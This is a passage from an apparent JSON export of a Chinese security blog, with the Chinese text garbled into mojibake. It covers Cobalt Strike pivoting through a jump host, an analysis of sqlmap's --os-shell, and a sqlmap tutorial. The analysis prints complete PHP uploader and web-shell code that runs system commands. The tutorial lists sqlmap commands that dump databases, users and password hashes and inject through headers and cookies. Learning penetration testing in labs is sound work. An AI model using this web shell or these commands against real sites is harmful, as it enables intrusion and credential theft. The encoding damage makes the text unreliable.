çš„åé—¨ï¼Œé€šè¿‡åé—¨æŸ¥çœ‹ç½‘ç»œä¿¡æ¯å‘ç°å­˜åœ¨ 172.16.214.0/24 ç½‘æ®µï¼Œè·³æ¿æœºæ‹¥æœ‰åŒç½‘å¡æ˜¯å¯ä»¥è®¿é—®å†…ç½‘ä¸»æœºçš„ï¼Œæ‰€ä»¥åœ¨ CS ä¸­å¯ä»¥é€šè¿‡è·³æ¿æœºè®¿é—®å†…ç½‘ä¸»æœº ç”Ÿæˆç›‘å¬å™¨ï¼Œé€‰æ‹©Beacon TCP ç”Ÿæˆåé—¨ windows executable(s) å°†åé—¨å¤åˆ¶åˆ°å†…ç½‘ä¸»æœº(172.16.214.141)ä¸Šå¹¶æ‰§è¡Œ åœ¨ cs ä¸­è¿›å…¥ä¼šè¯ beaconï¼Œä½¿ç”¨å‘½ä»¤è¿æ¥å†…ç½‘ä¸»æœº connect 172.14.214.141 4444 åäºŒã€CSåå‘è¿æ¥å¤šå±‚å†…ç½‘ä½¿ç”¨æ­£å‘è¿æ¥å¾ˆå¯èƒ½å› ä¸ºå†…ç½‘é˜²ç«å¢™çš„å­˜åœ¨é­åˆ°æ‹¦æˆªè€Œè¿æ¥å¤±è´¥ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨åå‘è¿æ¥çªç ´é˜²ç«å¢™çš„æ‹¦æˆª åœ¨é€‰æ‹©åšä»£ç†çš„ä¼šè¯é€‰æ‹© listenerï¼Œå³è·³æ¿æœºçš„ä¼šè¯ æ–°å»ºç›‘å¬å™¨ åˆ›å»ºåé—¨ é€‰æ‹©å¸¦æœ‰ s çš„é€‰é¡¹ï¼Œåœ¨ listener é€‰æ‹©åˆšåˆšåˆ›å»ºçš„ç›‘å¬å™¨ åœ¨å†…ç½‘ä¸»æœºä¸Šæ‰§è¡Œåé—¨ æ‰§è¡Œåï¼Œåé—¨ä¼šä¸»åŠ¨è¿æ¥åˆ°è·³æ¿æœºï¼Œcs å³ä¼šä¸Šçº¿ åä¸‰ã€å‚è€ƒé“¾æ¥ https://blog.csdn.net/weixin_44677409/article/details/102725129 https://www.freebuf.com/articles/web/255876.html https://zhuanlan.zhihu.com/p/359251293 https://www.mrwu.red/fenxiang/3673.html https://wiki.wgpsec.org/knowledge/intranet/Aggressor-script.html","categories":[{"name":"å®‰å…¨å·¥å…·/å®‰å…¨å¼€å‘","slug":"å®‰å…¨å·¥å…·-å®‰å…¨å¼€å‘","permalink":"https://wolke.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://wolke.cn/tags/CobaltStrike/"},{"name":"å†…ç½‘å®‰å…¨","slug":"å†…ç½‘å®‰å…¨","permalink":"https://wolke.cn/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"Sqlmapçš„--os-shellåŸç†","slug":"Sqlmapçš„-os-shellåŸç†","date":"2022-02-15T14:56:28.000Z","updated":"2022-02-15T15:07:44.362Z","comments":true,"path":"post/409cdb09.html","link":"","permalink":"https://wolke.cn/post/409cdb09.html","excerpt":"","text":"&emsp;&emsp;æœ€è¿‘ä¹Ÿæ˜¯åœ¨ç ”ç©¶sqlmapï¼Œæ„Ÿè§‰â€“os-shellè¿™ä¸ªå‘½ä»¤ç¡®å®å¾ˆå‰å®³ï¼Œä½†æˆ‘å¹¶ä¸çŸ¥å®ƒçš„åŸç†ï¼Œæ‰€ä»¥æ¥ç ”ç©¶ä¸€ä¸‹ ä¸€ã€ç¯å¢ƒ æ“ä½œç³»ç»Ÿï¼šWin10 è„šæœ¬è¯­è¨€ï¼šPHP 5.3.29 Webå®¹å™¨ï¼šApache 2.4.39 æ•°æ®åº“ï¼šMysql 5.7.26 äºŒã€ç®€å•æµ‹è¯•&emsp;&emsp;åˆ©ç”¨sqlmapè¿›è¡Œæ³¨å…¥æ£€æµ‹ sqlmap -u &quot;http://192.168.100.119/sql_injection/sqlilabs/Less-1/index.php?id=1&quot; --batch sqlmap -u &quot;http://192.168.100.119/sql_injection/sqlilabs/Less-1/index.php?id=1&quot; --os-shell &emsp;&emsp;é€‰æ‹©è¯­è¨€ï¼Œsqlmapé»˜è®¤ä¸ºphpï¼Œæ­¤å¤„æ ¹æ®éœ€æ±‚é€‰æ‹© &emsp;&emsp;è¾“å…¥ç»å¯¹è·¯å¾„ &emsp;&emsp;ä¸Šä¼ æ–‡ä»¶ &emsp;&emsp;å»ºç«‹os shellç„¶åå‘½ä»¤æ‰§è¡Œ &emsp;&emsp;æ–­å¼€shellï¼Œæ¸…é™¤ä¸Šä¼ çš„æ–‡ä»¶ è¿™ä¸ªæ—¶å€™sqlmapä¸»è¦åšäº†ä¸‰ä»¶äº‹ è¿›è¡Œç›®æ ‡çš„ä¸€ä¸ªåŸºç¡€ä¿¡æ¯çš„æ¢æµ‹ ä¸Šä¼ shellåˆ°ç›®æ ‡webç½‘ç«™ä¸Š é€€å‡ºæ—¶åˆ é™¤shell ä¸‰ã€åŸç†åˆ†æ&emsp;&emsp;WireSharkæ•è·æ•°æ®åŒ…ï¼ŒåªæŸ¥çœ‹httpæ•°æ®åŒ…ã€‚ 1ã€sqlmapä¸Šä¼ ä¸€ä¸ªå…·æœ‰ä¸Šä¼ åŠŸèƒ½çš„é©¬&emsp;&emsp;Sqlmapä½¿ç”¨into outfileå‡½æ•°å°†ä¸€ä¸ªå…·æœ‰ä¸Šä¼ åŠŸèƒ½çš„phpæ–‡ä»¶å†™åˆ°å½“å‰ç½‘ç«™æ ¹ç›®å½•ä¸‹ &emsp;&emsp;è¿½è¸ªhttpæµå¯ä»¥çœ‹åˆ°å†…å®¹è¢«urlç¼–ç äº†ï¼Œè§£å¼€åå¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡into outfileè¿›è¡Œæ–‡ä»¶çš„å†™å…¥ã€‚&emsp;&emsp;é©¬çš„å†…å®¹è¿›è¡Œäº†16è¿›åˆ¶ç¼–ç ï¼Œè§£å¼€åæŸ¥çœ‹ä»£ç å°±å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½çš„é©¬ã€‚ 1 Dumb Dumb&lt;?phpif (isset($_REQUEST[&quot;upload&quot;])) &#123; $dir=$_REQUEST[&quot;uploadDir&quot;]; if (phpversion()&lt;&#x27;4.1.0&#x27;) &#123; $file=$HTTP_POST_FILES[&quot;file&quot;][&quot;name&quot;]; @move_uploaded_file($HTTP_POST_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$dir.&quot;/&quot;.$file) or die(); &#125; else &#123; $file=$_FILES[&quot;file&quot;][&quot;name&quot;]; @move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$dir.&quot;/&quot;.$file) or die(); &#125; @chmod($dir.&quot;/&quot;.$file,0755); echo &quot;File uploaded&quot;;&#125; else &#123; echo &quot;&lt;form action=&quot;.$_SERVER[&quot;PHP_SELF&quot;].&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=D:\\\\phpstudy_pro\\\\WWW\\\\sql_injection\\\\sqlilabs\\\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;;&#125;?&gt; 2ã€é€šè¿‡ä¸Šä¼ çš„é©¬è¿›è¡Œshellçš„ä¸Šä¼ &emsp;&emsp;è¿½è¸ªhttpæµå¯ä»¥çœ‹åˆ°bodyä¸ºshellçš„å†…å®¹ã€‚ &lt;?php $c=$_REQUEST[&quot;cmd&quot;];@set_time_limit(0);@ignore_user_abort(1);@ini_set(&quot;max_execution_time&quot;,0);$z=@ini_get(&quot;disable_functions&quot;);if(!empty($z)) &#123; $z=preg_replace(&quot;/[, ]+/&quot;,&#x27;,&#x27;,$z); $z=explode(&#x27;,&#x27;,$z); $z=array_map(&quot;trim&quot;,$z);&#125; else &#123; $z=array();&#125;$c=$c.&quot; 2&gt;&amp;1\\n&quot;;function f($n) &#123; global $z; return is_callable($n)and!in_array($n,$z);&#125;if(f(&quot;system&quot;)) &#123; ob_start(); system($c); $w=ob_get_clean();&#125; elseif(f(&quot;proc_open&quot;)) &#123; $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t); $w=NULL; while(!feof($t[1])) &#123; $w.=fread($t[1],512); &#125; @proc_close($y);&#125; elseif(f(&quot;shell_exec&quot;)) &#123; $w=shell_exec($c);&#125; elseif(f(&quot;passthru&quot;)) &#123; ob_start(); passthru($c); $w=ob_get_clean();&#125; elseif(f(&quot;popen&quot;)) &#123; $x=popen($c,r); $w=NULL; if(is_resource($x)) &#123; while(!feof($x)) &#123; $w.=fread($x,512); &#125; &#125; @pclose($x);&#125; elseif(f(&quot;exec&quot;)) &#123; $w=array(); exec($c,$w); $w=join(chr(10),$w).chr(10);&#125; else &#123; $w=0;&#125;echo&quot;&lt;pre&gt;$w&lt;/pre&gt;&quot;;?&gt; &emsp;&emsp;ä¸Šè¿°ä»£ç å®ç°äº†os-shellå¾—åˆ°äº†å‘½ä»¤åï¼Œå¦‚ä½•æ‰§è¡Œå‘½ä»¤ä»¥åŠè¾“å‡ºæ‰§è¡Œç»“æœåˆ°os-shellä¸­ã€‚ &emsp;&emsp;å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨os-shellä¸­æ‰§è¡Œå‘½ä»¤ã€‚ 3ã€shellä¼ å‚è¿›è¡Œå‘½ä»¤æ‰§è¡Œ 4ã€åˆ é™¤shell&emsp;&emsp;æ‰§è¡Œå‘½ä»¤åˆ é™¤shellã€‚ å››ã€os-shellçš„ä½¿ç”¨æ¡ä»¶ æ•°æ®åº“ç”¨æˆ·æ˜¯dbaæƒé™ çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„ phpå½“ä¸­çš„gpcä¸ºoffæ—¶ï¼Œphpè‡ªåŠ¨è½¬ä¹‰ä¸ºå…³é—­çŠ¶æ€ å°±ç®—å…·å¤‡ä»¥ä¸Š3ä¸ªæ¡ä»¶ï¼Œå› ä¸ºæ¶‰åŠåˆ°ç³»ç»Ÿå‘½ä»¤ï¼Œä¹Ÿæœªå¿…å¯ä»¥æ‰§è¡ŒæˆåŠŸ äº”ã€å‚è€ƒé“¾æ¥ https://xz.aliyun.com/t/7942 https://www.cnblogs.com/zzjdbk/p/13951047.html","categories":[{"name":"å®‰å…¨å·¥å…·/å®‰å…¨å¼€å‘","slug":"å®‰å…¨å·¥å…·-å®‰å…¨å¼€å‘","permalink":"https://wolke.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://wolke.cn/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"Sqlmap","slug":"Sqlmap","permalink":"https://wolke.cn/tags/Sqlmap/"}],"author":"w01ke"},{"title":"Sqlmapçš„å®‰è£…åŠä½¿ç”¨","slug":"Sqlmapçš„å®‰è£…åŠä½¿ç”¨","date":"2022-02-14T15:43:26.000Z","updated":"2022-02-14T15:50:27.715Z","comments":true,"path":"post/f2361d57.html","link":"","permalink":"https://wolke.cn/post/f2361d57.html","excerpt":"","text":"ä¸€ã€Sqlmapä»‹ç»&emsp;&emsp;Sqlmapæ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„sqlæ³¨å…¥å·¥å…·ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯æ‰«æã€å‘ç°å¹¶åˆ©ç”¨ç»™å®šurlçš„SQLæ³¨å…¥æ¼æ´ï¼Œå†…ç½®äº†å¾ˆå¤šç»•è¿‡æ’ä»¶ï¼Œæ”¯æŒçš„æ•°æ®åº“æ˜¯MySQLã€Oracleã€postgreSQLã€Microsoft SQL Serverã€Microsoft Accessã€IBM DB2ã€SQLiteã€Firebirdã€Sybaseå’ŒSAP MaxDB &emsp;&emsp;Sqlmapé‡‡ç”¨äº†ä»¥ä¸‹5ç§ç‹¬ç‰¹çš„SQLæ³¨å…¥æŠ€æœ¯ åŸºäºå¸ƒå°”ç±»å‹çš„ç›²æ³¨ï¼Œå³å¯ä»¥æ ¹æ®è¿”å›é¡µé¢åˆ¤æ–­æ¡ä»¶çœŸå‡çš„æ³¨å…¥ åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œå³ä¸èƒ½æ ¹æ®é¡µé¢è¿”å›çš„å†…å®¹åˆ¤æ–­ä»»ä½•ä¿¡æ¯ï¼Œè¦ç”¨æ¡ä»¶è¯­å¥æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥æ˜¯å¦å·²æ‰§è¡Œï¼ˆå³é¡µé¢è¿”å›æ—¶é—´æ˜¯å¦å¢åŠ ï¼‰æ¥åˆ¤æ–­ åŸºäºæŠ¥é”™æ³¨å…¥ï¼Œå³é¡µé¢ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œæˆ–è€…æŠŠæ³¨å…¥çš„è¯­å¥çš„ç»“æœç›´æ¥è¿”å›åˆ°é¡µé¢ä¸­ è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œåœ¨å¯ä»¥ä½¿ç”¨unionçš„æƒ…å†µä¸‹çš„æ³¨å…¥ å †æŸ¥è¯¢æ³¨å…¥ï¼Œå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥æ—¶çš„æ³¨å…¥ &emsp;&emsp;Sqlmapçš„å¼ºå¤§åŠŸèƒ½åŒ…æ‹¬æ•°æ®åº“æŒ‡çº¹è¯†åˆ«ã€æ•°æ®åº“æšä¸¾ã€æ•°æ®åº“æå–ã€è®¿é—®ç›®æ ‡æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨è·å–å®Œå…¨çš„æ“ä½œæƒé™æ—¶å®è¡Œä»»æ„å‘½ä»¤ã€‚Sqlmapçš„åŠŸèƒ½å¼ºå¤§åˆ°è®©äººæƒŠå¹ï¼Œå½“å¸¸è§„çš„æ³¨å…¥å·¥å…·ä¸èƒ½åˆ©ç”¨SQLæ³¨å…¥æ¼æ´è¿›è¡Œæ³¨å…¥æ—¶ï¼Œä½¿ç”¨sqlmapä¼šæœ‰æ„æƒ³ä¸åˆ°çš„æ•ˆæœ äºŒã€å®‰è£…æ­¥éª¤ é¦–å…ˆå®‰è£…pythonï¼Œå¹¶é…ç½®å¥½ç¯å¢ƒå˜é‡ï¼ˆD:\\python3.8ï¼‰ å®˜ç½‘ä¸‹è½½sqlmapå¹¶è§£å‹ï¼Œæˆ‘å°†è§£å‹åçš„æ–‡ä»¶å¤¹å‘½åä¸ºsqlmap å°†sqlmapæ‹·è´åˆ°pythonç›®å½•ä¸‹ é…ç½®sqlmapçš„ç¯å¢ƒå˜é‡ï¼ˆD:\\python3.8\\sqlmap) æ‰“å¼€å‘½ä»¤è¡Œï¼Œè¾“å…¥sqlmap.pyå³å¯ ä¸‰ã€Sqlmapå…¥é—¨1ã€åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥&emsp;&emsp;æ‹¿åˆ°ä¸€ä¸ªç«™ç‚¹ï¼Œé¦–å…ˆå¾—åˆ¤æ–­å®ƒæ˜¯å¦æœ‰æ³¨å…¥ &emsp;&emsp;å‡å®šæ³¨å…¥ç‚¹æ˜¯http://127.0.0.1/sql/Less-1/?id=1ï¼Œåˆ¤æ–­å…¶æ˜¯å¦å­˜åœ¨æ³¨å…¥çš„å‘½ä»¤å¦‚ä¸‹ï¼š Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 &emsp;&emsp;å«Œéº»çƒ¦è¾“å…¥yï¼Œå¯ä»¥åŠ ä¸ªâ€“batchï¼Œæ‰€æœ‰éƒ½é»˜è®¤ &emsp;&emsp;-uæˆ–--urlæŒ‡å®šç›®æ ‡ &emsp;&emsp;æ˜¾ç¤ºç»“æœå¦‚å›¾æ‰€ç¤º &emsp;&emsp;è¿˜æœ‰ä¸€ç§æƒ…å†µï¼Œå½“æ³¨å…¥ç‚¹åé¢çš„å‚æ•°å¤§äºç­‰äºä¸¤ä¸ªæ—¶ï¼Œéœ€è¦åŠ åŒå¼•å·ï¼Œå¦‚ä¸‹æ‰€ç¤º Sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&amp;uid=2&quot; 2ã€åˆ¤æ–­æ–‡æœ¬ä¸­çš„è¯·æ±‚æ˜¯å¦å­˜åœ¨æ³¨å…¥&emsp;&emsp;ä»æ–‡ä»¶ä¸­åŠ è½½HTTPè¯·æ±‚ï¼Œsqlmapå¯ä»¥ä»ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ä¸­è·å–HTTPè¯·æ±‚ï¼Œè¿™æ ·å°±å¯ä»¥ä¸è®¾ç½®å…¶ä»–å‚æ•°ï¼ˆå¦‚cookieï¼ŒPOSTæ•°æ®ç­‰ç­‰ï¼‰ï¼Œtxtæ–‡ä»¶ä¸­çš„å†…å®¹ä¸ºwebæ•°æ®åŒ…ï¼ˆä¸€èˆ¬å¯ä»¥ä½¿ç”¨burpæŠ“åŒ…ï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º &emsp;&emsp;åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥çš„å‘½ä»¤å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿è¡Œåçš„ç»“æœå¦‚å›¾æ‰€ç¤º Sqlmap.py -r C:\\Users\\win7\\Desktop\\123.txt &emsp;&emsp;-rä»æ–‡ä»¶åŠ è½½HTTPè¯·æ±‚ 3ã€æŸ¥è¯¢å½“å‰ç”¨æˆ·ä¸‹çš„æ‰€æœ‰æ•°æ®åº“&emsp;&emsp;è¯¥å‘½ä»¤æ˜¯ç¡®å®šç½‘ç«™å­˜åœ¨æ³¨å…¥åï¼Œç”¨æˆ·æŸ¥è¯¢å½“å‰ç”¨æˆ·ä¸‹æ‰€æœ‰çš„æ•°æ®åº“ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚å¦‚æœå½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰æ•°æ®åº“åˆ—è¡¨ä¿¡æ¯çš„è¡¨ï¼Œä½¿ç”¨è¯¥å‘½ä»¤å°±å¯ä»¥åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ï¼Œå¦‚å›¾æ‰€ç¤º Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --dbs 4ã€è·å–æ•°æ®åº“ä¸­çš„è¡¨å&emsp;&emsp;è¯¥å‘½ä»¤çš„ä½œç”¨æ˜¯æŸ¥è¯¢å®Œæ•°æ®åº“åï¼ŒæŸ¥è¯¢æŒ‡å®šæ•°æ®åº“ä¸­çš„æ‰€æœ‰çš„è¡¨åï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚å¦‚æœåœ¨è¯¥å‘½ä»¤ä¸­ä¸åŠ å…¥-Då‚æ•°æ¥æŒ‡å®šæŸä¸€ä¸ªå…·ä½“çš„æ•°æ®åº“ï¼Œé‚£ä¹ˆsqlmapä¼šåˆ—å‡ºæ•°æ®åº“ä¸­æ‰€æœ‰çš„è¡¨ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security --tables &emsp;&emsp;-D DBï¼Œè¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“å 5ã€è·å–è¡¨ä¸­çš„å­—æ®µå&emsp;&emsp;è¯¥å‘½ä»¤çš„ä½œç”¨æ˜¯æŸ¥è¯¢å®Œè¡¨ååï¼ŒæŸ¥è¯¢è¯¥è¡¨ä¸­æ‰€æœ‰çš„å­—æ®µåï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚è¿è¡Œè¯¥å‘½ä»¤çš„ç»“æœå¦‚å›¾æ‰€ç¤ºï¼š Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security -T users --columns &emsp;&emsp;-T TBLï¼Œè¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“è¡¨ &emsp;&emsp;--columnsæšä¸¾DBMSæ•°æ®åº“è¡¨åˆ— 6ã€è·å–å­—æ®µå†…å®¹&emsp;&emsp;è¯¥å‘½ä»¤çš„ä½œç”¨æ˜¯æŸ¥è¯¢å®Œå­—æ®µåä¹‹åï¼Œè·å–è¯¥å­—ä½“ä¸­å…·ä½“çš„æ•°æ®ä¿¡æ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚è¿è¡Œè¯¥å‘½ä»¤çš„ç»“æœå¦‚å›¾æ‰€ç¤ºï¼š Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security -T users -C id,password,username --dump &emsp;&emsp;-C COLï¼Œè¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“åˆ— &emsp;&emsp;--dump è½¬å‚¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„è¡¨é¡¹ 7ã€è·å–æ•°æ®åº“ä¸­æ‰€æœ‰çš„ç”¨æˆ·&emsp;&emsp;è¯¥å‘½ä»¤çš„ä½œç”¨æ˜¯åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰ç”¨æˆ·ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚åœ¨å½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰ç”¨æˆ·çš„è¡¨çš„æƒé™æ—¶ï¼Œä½¿ç”¨è¯¥å‘½ä»¤å°±å¯ä»¥åˆ—å‡ºæ‰€æœ‰ç®¡ç†ç”¨æˆ·ï¼Œè¿è¡Œè¯¥å‘½ä»¤çš„ç»“æœå¦‚å›¾æ‰€ç¤ºï¼š Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --users &emsp;&emsp;--users æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ· 8ã€è·å–æ•°æ®åº“ç”¨æˆ·çš„å¯†ç &emsp;&emsp;è¯¥å‘½ä»¤çš„ä½œç”¨æ˜¯åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“çš„ç”¨æˆ·çš„å¯†ç ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚å¦‚æœå½“å‰ç”¨æˆ·æœ‰è¯»å–åŒ…å«ç”¨æˆ·å¯†ç çš„æƒé™ï¼Œsqlmapä¼šå…ˆåˆ—ä¸¾å‡ºç”¨æˆ·ï¼Œç„¶ååˆ—å‡ºHashï¼Œå¹¶å°è¯•ç ´è§£ï¼Œè¿è¡Œè¯¥å‘½ä»¤çš„ç»“æœå¦‚å›¾æ‰€ç¤ºï¼š Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --passwords &emsp;&emsp;--passwords æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·å¯†ç å“ˆå¸Œ 9ã€è·å–å½“å‰ç½‘ç«™æ•°æ®åº“çš„åç§°&emsp;&emsp;è¯¥å‘½ä»¤çš„ä½œç”¨æ˜¯åˆ—å‡ºå½“å‰ç½‘ç«™ä½¿ç”¨çš„æ•°æ®åº“ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œè¿è¡Œè¯¥å‘½ä»¤çš„ç»“æœå¦‚å›¾æ‰€ç¤ºï¼š Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --current-db &emsp;&emsp;--current-db æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰æ•°æ®åº“ 10ã€è·å–å½“å‰ç½‘ç«™æ•°æ®åº“çš„ç”¨æˆ·&emsp;&emsp;è¯¥å‘½ä»¤çš„ä½œç”¨æ˜¯åˆ—å‡ºå½“å‰ç½‘ç«™ä½¿ç”¨çš„æ•°æ®åº“ç”¨æˆ·ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œè¿è¡Œè¯¥å‘½ä»¤çš„ç»“æœå¦‚å›¾æ‰€ç¤ºï¼š Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --current-user &emsp;&emsp;--current-user æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡è¯† 11ã€æŠ¥é”™æ³¨å…¥(error based)&emsp;&emsp;æ— æ³•å‘ç°æŠ¥é”™ä½ï¼Œä½†æ˜¯æ•°æ®åº“å‡ºé”™ä¼šçˆ†å‡ºæ¥ sqlmap -u [ç›®æ ‡url] --current-db --batch --threads 10 --technique E 12ã€å¸ƒå°”å‹æ³¨å…¥ (boolen based)&emsp;&emsp;æ— æ³•å‘ç°æŠ¥é”™ä½ï¼Œæ•°æ®åº“è¢«ç ´åä¹Ÿæ— æ³•çˆ†å‡ºæ¥ï¼Œä½†æ˜¯ç•Œé¢ä¸Šåªä¼šå‡ºç°æœ‰å’Œæ²¡æœ‰ä¸œè¥¿ä¸¤ç§æƒ…å†µ sqlmap -u [ç›®æ ‡url] --current-db --batch --threads 10 --technique B 13ã€å¸ƒå°”å‹æ—¶é—´ç›²æ³¨ (time based)sqlmap -u [ç›®æ ‡url] --current-db --batch --threads 10 --technique T -v 3 14ã€æ ‡å‡†æ³¨å…¥ï¼ˆstandard basedï¼‰sqlmap -u [ç›®æ ‡url] --current-db --batch --threads 10 --technique S 15ã€è”åˆæ³¨å…¥ï¼ˆunion basedï¼‰sqlmap -u [ç›®æ ‡url] --dbs --batch --threads 10 --technique U 16ã€POSTæ–¹é¢æ³¨å…¥&emsp;&emsp;--data åé¢è·Ÿçš„æ˜¯postçš„æ•°æ®ï¼›*å·æ ‡å“ªï¼Œå°±æ˜¯è®©sqlmapæ‰“å“ª sqlmap -u [ç›®æ ‡url] --data &quot;uname=admin*&amp;passwd=admin&amp;submit=Submit&quot; --current-db --batch --threads 10 --technique E 17ã€è¯·æ±‚å¤´æ³¨å…¥&emsp;&emsp;åœ¨ä½¿ç”¨è¯·æ±‚å¤´æ³¨å…¥çš„æ—¶å€™ï¼Œâ€“levelå¿…é¡»å¤§äº3 sqlmap -u [ç›®æ ‡url] --user-agent=&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0*&quot; --level 4 --dbs --threads 10 --batch --technique E &emsp;&emsp;æˆ–è€…ä½¿ç”¨burpæŠ“åŒ…ï¼Œcopy to fileä¿å­˜ä¸ºshuju.txtï¼Œæ‰“å¼€æ–‡ä»¶ï¼Œåœ¨è¦æ³¨å…¥çš„åœ°æ–¹æ‰“*ï¼Œç„¶å sqlmap -r &quot;root/shuju.txt&quot; --dbs --threads 10 --batch --technique Esqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie=&quot;uname = admin*;__cfduid=dab97c3dd6a54c5ca485d3e880af5ce271605180690&quot; --level 4 --dbs --threads 10 --batch --technique E å››ã€sqlmapè¿›é˜¶1ã€â€“level 5ï¼šæ¢æµ‹ç­‰çº§&emsp;&emsp;å‚æ•°--level 5æŒ‡éœ€è¦æ‰§è¡Œçš„æµ‹è¯•ç­‰çº§ï¼Œä¸€å…±æœ‰5ä¸ªç­‰çº§ï¼ˆ1-5ï¼‰ï¼Œå¯ä»¥ç”¨ä¸åŒlevelï¼Œé»˜è®¤æ˜¯1ã€‚ &emsp;&emsp;Sqlmapä½¿ç”¨çš„payloadå¯ä»¥åœ¨xml/payload.xmlä¸­å¯ä»¥çœ‹åˆ°ï¼Œä¹Ÿå¯ä»¥æ ¹æ®ç›¸åº”çš„æ ¼å¼æ·»åŠ è‡ªå·±çš„payloadï¼Œå…¶ä¸­5çº§åŒ…å«çš„payloadæœ€å¤šï¼Œä¼šè‡ªåŠ¨ç ´è§£å‡ºcookieã€xffç­‰å¤´éƒ¨æ³¨å…¥ã€‚å½“ç„¶ï¼Œlevel 5çš„è¿è¡Œé€Ÿåº¦ä¹Ÿæ¯”è¾ƒæ…¢ã€‚ &emsp;&emsp;è¿™ä¸ªå‚æ•°ä¼šå½±å“æµ‹è¯•çš„æ³¨å…¥ç‚¹ï¼Œgetå’Œpostçš„æ•°æ®éƒ½ä¼šè¿›è¡Œæµ‹è¯•ï¼Œhttp cookieåœ¨levelä¸º2çš„æ—¶å€™å°±ä¼šæµ‹è¯•ï¼Œhttp user-agent/refererå¤´åœ¨levelä¸º3çš„æ—¶å€™å°±ä¼šè¿›è¡Œæµ‹è¯•ã€‚æ€»ä¹‹ï¼Œåœ¨ä¸ç¡®å®šé‚£ä¸ªpayloadæˆ–è€…å‚æ•°æ³¨å…¥ç‚¹æ—¶ï¼Œä¸ºäº†ä¿è¯å…¨é¢æ€§ï¼Œä¸ºäº†ä¿è¯å…¨é¢æ€§ï¼Œå»ºè®®ä½¿ç”¨é«˜çš„levelå€¼ 